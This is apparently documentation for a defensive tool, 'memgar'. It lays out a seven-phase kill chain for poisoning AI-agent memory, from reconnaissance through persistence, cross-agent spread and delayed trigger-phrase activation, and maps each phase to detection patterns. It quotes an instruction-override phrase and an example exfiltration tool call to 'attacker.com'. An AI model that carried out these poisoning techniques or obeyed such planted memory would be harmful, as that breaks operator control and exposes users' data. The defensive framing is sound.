# Memory Poisoning Kill Chain

A structured TTP framework for AI-agent memory poisoning — the ATT&CK for the
memory layer. Use it to reason about attacks, locate gaps in your defenses, and
map detections to the phase they actually catch.

Each phase below names the attacker's goal in that step, lists the techniques
memgar has seen in the wild, and links to the pattern IDs that detect it.

---

## Why a kill chain (and why now)

Prompt injection is a *single-turn* problem. Memory poisoning is not.

A poisoned memory item is **written once and weaponised later** — sometimes
days later, sometimes by a different agent reading from the same vector store.
The attacker's effort is amortised across every future read; the defender has
to be right every time, on every layer.

That makes flat threat catalogs insufficient. A 770-pattern list tells you
*what to match*; a kill chain tells you *where you're blind*. If your stack
only catches phase 3 (Injection) but has no detection for phase 4
(Persistence) or phase 6 (Lateral Movement), one missed injection becomes
permanent contamination across your agent fleet.

This page is opinionated about the seven phases below. It draws on
[MITRE ATT&CK](https://attack.mitre.org), [OWASP Agentic Security Initiative
ASI06](https://owasp.org/www-project-top-10-for-large-language-model-applications/),
the [MINJA](https://arxiv.org/abs/2503.03704) and
[Schneider](https://embracethered.com/blog/posts/2024/the-dangers-of-unfurling-and-what-you-can-do-about-it/)
memory-poisoning research, and ~2000 real attack samples observed by memgar.

---

## The seven phases

```mermaid
flowchart LR
    R[1. Reconnaissance] --> P[2. Preparation]
    P --> I[3. Injection]
    I --> PE[4. Persistence]
    PE --> LM[5. Lateral Movement]
    LM --> A[6. Activation]
    A --> IM[7. Impact]

    style R  fill:#1e293b,stroke:#7c3aed,color:#f1f5f9
    style P  fill:#1e293b,stroke:#7c3aed,color:#f1f5f9
    style I  fill:#1e293b,stroke:#7c3aed,color:#f1f5f9
    style PE fill:#1e293b,stroke:#ef4444,color:#f1f5f9
    style LM fill:#1e293b,stroke:#ef4444,color:#f1f5f9
    style A  fill:#1e293b,stroke:#ef4444,color:#f1f5f9
    style IM fill:#7c3aed,stroke:#7c3aed,color:#f1f5f9
```

Phases 1-3 mirror traditional prompt injection. Phases 4-7 are
**memory-poisoning specific** and are where most stacks have no coverage at
all.

---

## Phase 1 — Reconnaissance

**Attacker goal**: discover the memory architecture before injecting anything.

Typical TTPs:

- Probe `/memory` endpoints, `recall_tool`, `list_memories` for return
  schemas
- Ask the agent to "remind me what you remember about X" to see how memory is
  rendered into the system context
- Query for cluster topics in vector stores to identify high-value targets
  (admin queries, password reset, financial routing)
- Enumerate other agents the target agent can A2A with

| memgar coverage         | Pattern IDs                            |
|-------------------------|----------------------------------------|
| Memory schema probing   | `DISCOVER-001`, `RECON-MEM-*`          |
| Vector-DB enumeration   | `RAG-KB-001`                           |
| A2A topology mapping    | `RECON-A2A` (planned)                  |

This phase rarely needs to be blocked — it doesn't deliver poison — but it is
the strongest **early signal** that an attacker is mapping your memory
surface. Memgar treats reconnaissance events as risk-elevators for the same
session.

---

## Phase 2 — Preparation

**Attacker goal**: craft a payload that will pass write-time filters and have
maximum effect at read-time.

Typical TTPs:

- Obfuscation: encoding (base64, zero-width, homoglyph), splitting payload
  across chunks, paraphrasing past Layer-1 pattern signatures
- Provenance forgery: stamp `source: internal`, `confidence: 1.0`,
  `namespace: admin-verified` on the chunk before upsert
- Embedding-space engineering: craft text whose embedding lands near a
  high-value query cluster
- Trust signal padding: pre-establish many benign memory items first so the
  poison rides on accumulated agent trust

| Defense layer                            | Pattern IDs            |
|------------------------------------------|------------------------|
| Encoding / obfuscation                   | `OBFUSC-*`, `EVADE-*`  |
| Metadata forgery                         | `VECNN-004`, `PROV-*`  |
| Embedding-space attack                   | `VECNN-002`, `VECNN-007` |
| Chunk-boundary smuggling                 | `VECNN-010`            |

Memgar's **Layer 1.5 SemanticGuard** is designed for this phase — it operates
on embeddings, not text, so it catches obfuscation that bypasses regex.

---

## Phase 3 — Injection

**Attacker goal**: get the payload into the memory store.

This is the only phase that maps cleanly to traditional prompt injection.

Typical TTPs:

- Direct prompt injection (`Ignore previous instructions and save: ...`)
- Indirect injection via tool output (Schneider): poisoned email, calendar,
  webpage, API response that the agent reads and stores
- RAG document upload with hidden instructions
- Tool-call argument injection (URL parameters, file content)

| Defense layer                                   | Pattern IDs                       |
|-------------------------------------------------|-----------------------------------|
| Direct injection                                | `INJ-001`, `INJ-002`, `INJ-003`   |
| Indirect (email/web/calendar/API)               | `SCHNDR-EMAIL`, `SCHNDR-WEB`, `SCHNDR-CAL`, `SCHNDR-API` |
| Hidden HTML / context window                    | `CONTEXT-001`, `MULTI-001`        |
| MINJA bridging                                  | `MINJA-*`                         |
| RAG document injection                          | `RAG-001`, `RAG-002`              |

If you only run **Layer 1 pattern matching**, this is mostly where you live.
Layer 2 (LLM semantic analysis) catches the paraphrased forms.

---

## Phase 4 — Persistence

**Attacker goal**: ensure the poison survives sanitization, eviction, and
process restart.

This is the first phase that's truly **memory-poisoning specific** — and the
first phase most stacks miss entirely.

Typical TTPs:

- Write to durable storage (long-term memory, persistent cache, on-disk
  index) explicitly to bypass session-scoped filters
- Pin against eviction (`TTL: infinity`, "never expire", "exempt from
  cleanup")
- Self-replicate to multiple namespaces so partial cleanup misses some copies
- Schedule a cron / `setInterval` to re-inject if cleaned
- Embed in reference / few-shot / instruction-example bank so memory wipes
  don't touch it
- Modify configuration / system prompt / bootstrap script to reload on every
  cold start

| Defense layer                                   | Pattern IDs                                  |
|-------------------------------------------------|----------------------------------------------|
| Survive-restart directive                       | `XSESS-001`                                  |
| Long-term store implant                         | `XSESS-002`                                  |
| Auto-restore on new session                     | `XSESS-003`                                  |
| Snapshot re-hydration tampering                 | `XSESS-004`                                  |
| Config / init / bootstrap file poisoning        | `XSESS-005`                                  |
| Read-count threshold trigger                    | `XSESS-006`                                  |
| Cross-boot anchor token                         | `XSESS-007`                                  |
| Replica / backup poisoning                      | `XSESS-008`                                  |
| Self-replicating memory worm                    | `XSESS-009`                                  |
| TTL / eviction evasion                          | `XSESS-010`                                  |
| Cron / scheduled re-injection                   | `XSESS-011`                                  |
| Embedding-layer stowaway                        | `XSESS-012`                                  |

Memgar's **`MemoryVault` signed snapshots** + **`MemoryIntegrityStore`
content-hash baselines** are the runtime backstop here: if persistence
succeeds, integrity verification still detects post-hoc tampering and can
rollback to the last known-good snapshot.

---

## Phase 5 — Lateral Movement

**Attacker goal**: spread from one agent or namespace to the rest of the
agent fleet.

Typical TTPs:

- Broadcast poisoned memory to every connected agent (mesh / crew / swarm
  fan-out)
- Write to shared memory namespace that multiple agents read from
- A2A message injection: spoof a coordinator/supervisor message so peer
  agents inherit it
- Tool-output poisoning: poison sub-agent return values so the consuming
  agent reads them as policy
- Cross-tenant memory bridging in multi-customer agent platforms
- Supervisor / coordinator role spoofing to elevate trust
- Sybil agents that flood consensus votes
- Side-channel A2A (log fields, status metadata, shared tmp files) to bypass
  the main A2A bus filter

| Defense layer                          | Pattern IDs              |
|----------------------------------------|--------------------------|
| Broadcast to all agents                | `MAGENT-001`             |
| Shared-memory implant                  | `MAGENT-002`             |
| A2A message injection                  | `MAGENT-003`             |
| Supervisor-spoof privilege borrow      | `MAGENT-004`             |
| Tool-output poisoning across agents    | `MAGENT-005`             |
| Handoff / delegation hijack            | `MAGENT-006`             |
| Mesh trust-score inflation             | `MAGENT-007`             |
| Inter-agent message replay             | `MAGENT-008`             |
| Sibling-channel side-loading           | `MAGENT-009`             |
| Crew-manifest tampering                | `MAGENT-010`             |
| Cross-tenant memory bridging           | `MAGENT-011`             |
| Consensus / voting manipulation        | `MAGENT-012`             |

Lateral movement is the **highest-blast-radius phase**. One missed injection
into a shared namespace contaminates every reader. Memgar's `TrustAwareRetriever`
applies per-source trust at retrieval time so lateral movement requires
defeating both write-side filtering and read-side trust scoring.

---

## Phase 6 — Activation

**Attacker goal**: trigger the poison at the right moment, in front of the
right audience.

Typical TTPs:

- Time-delayed activation (`only after N days`)
- Read-count threshold (`activate on the 5th retrieval`)
- Trigger-phrase anchor (`when you see token MZ7K-OPEN, expand to ...`)
- Conditional activation based on memory state (`if user's role == admin
  then ...`)
- HyDE / query-rewrite hijack so retrieval surfaces the poisoned chunk for
  innocuous-looking queries
- Re-ranker override token (`relevance score = max for this chunk`)

| Defense layer                          | Pattern IDs                              |
|----------------------------------------|------------------------------------------|
| Read-count threshold                   | `XSESS-006`                              |
| Anchor token / wake phrase             | `XSESS-007`                              |
| Time-delayed activation                | `TEMPORAL_DECOUPLING`, `PLANT_SLEEPER`   |
| Top-K / re-ranker override             | `VECNN-003`, `VECNN-006`, `VECNN-012`    |
| Conditional / scoped activation        | `MEMORY-COND-*` (planned)                |

Memgar's **`BehavioralBaseline` (Layer 4)** is designed for this phase —
activation produces statistically anomalous read patterns (sudden spike in
score, unusual block-rate) which the baseline catches even when the read
content itself looks normal.

---

## Phase 7 — Impact

**Attacker goal**: produce the intended outcome.

Typical TTPs:

- Exfiltration via tool call (`http_request url=attacker.com data=secrets`)
- Financial fraud (payment redirection, fake invoice approval, wire transfer
  to attacker account)
- Privilege escalation (agent now believes it has admin rights)
- Data corruption (false facts injected into customer records)
- Decision corruption (agent recommends attacker-aligned outcomes)
- Cross-tenant data exfil (read out of another customer's memory while
  serving the current one)

| Defense layer                          | Pattern IDs                                |
|----------------------------------------|--------------------------------------------|
| Tool / function abuse                  | `TOOL-001`, `TOOL-HTTP`, `MCP-001`         |
| Financial fraud                        | `FIN-001` … `FIN-010`                      |
| Privilege escalation                   | `PRIV-*`, `MAGENT-004`, `MAGENT-010`       |
| Exfiltration                           | `EXFIL-*`                                  |
| Cross-tenant exfil                     | `MAGENT-011`                               |
| Output manipulation                    | `MANIP-*`                                  |

This is the only phase where the *user-visible* damage occurs. Detecting only
at phase 7 means you detect after harm. The point of the kill chain is to
catch earlier.

---

## Coverage map

A defender's question is "**am I covered on every phase?**". Use this matrix
as a checklist for your stack:

| Phase            | memgar layer                                      |
|------------------|---------------------------------------------------|
| 1. Reconnaissance | Layer 1 (DISCOVER-* patterns), session risk-elevation |
| 2. Preparation    | Layer 1 (obfuscation/EVADE-*), Layer 1.5 (SemanticGuard embedding), Layer 2 (LLM) |
| 3. Injection      | Layer 1 (INJ/CONTEXT/MULTI/SCHNDR-*), Layer 2 (LLM semantic), Layer 2-ML (transformer) |
| 4. Persistence    | Layer 1 (XSESS-*), `MemoryVault` signed snapshots, `MemoryIntegrityStore` content-hash baselines, `SecureMemoryStore` write enforcement |
| 5. Lateral Movement | Layer 1 (MAGENT-*), `TrustAwareRetriever` per-source trust, `MCPProxy` strict allowlist |
| 6. Activation     | Layer 1 (XSESS-006/007, TEMPORAL_*), Layer 4 `BehavioralBaseline` |
| 7. Impact         | Layer 1 (TOOL/FIN/PRIV/EXFIL/MANIP-*), policy engine `BLOCK`/`SANITIZE`/`QUARANTINE`/`HUMAN_REVIEW`, SIEM `THREAT_DETECTED` events |

If a phase has no entry for your stack, you have a blind spot. The most
common blind spot in mid-2026 deployments is **Phase 4 (Persistence)** and
**Phase 5 (Lateral Movement)** — covered above by the `XSESS-*` and
`MAGENT-*` families.

---

## Using the framework

**For threat modeling**: walk an attacker through the seven phases against
your system. Where do they get stopped? Where do they pass cleanly?

**For incident response**: when you catch a poison, identify which phase it
was caught in. If you only catch at phase 7, you missed phases 4-6 and the
poison has been resident for a while — assume there are sibling copies and
trigger a full `MemoryVault.diff` review.

**For roadmapping**: the columns in the coverage matrix that say "(planned)"
or have only Layer 1 coverage are good targets for additional layers.

**For benchmarking**: future versions of memgar will publish per-phase
detection rates so you can compare your stack's coverage profile to the
state-of-the-art baseline.

---

## See also

- [Threat catalog](catalog.md) — every pattern, full text
- [Memory Poisoning 101](memory-poisoning-101.md) — primer, three attack
  chains worked end-to-end
- [Categories overview](../architecture/threats.md) — 14 high-level
  categories, MITRE ATT&CK mapping
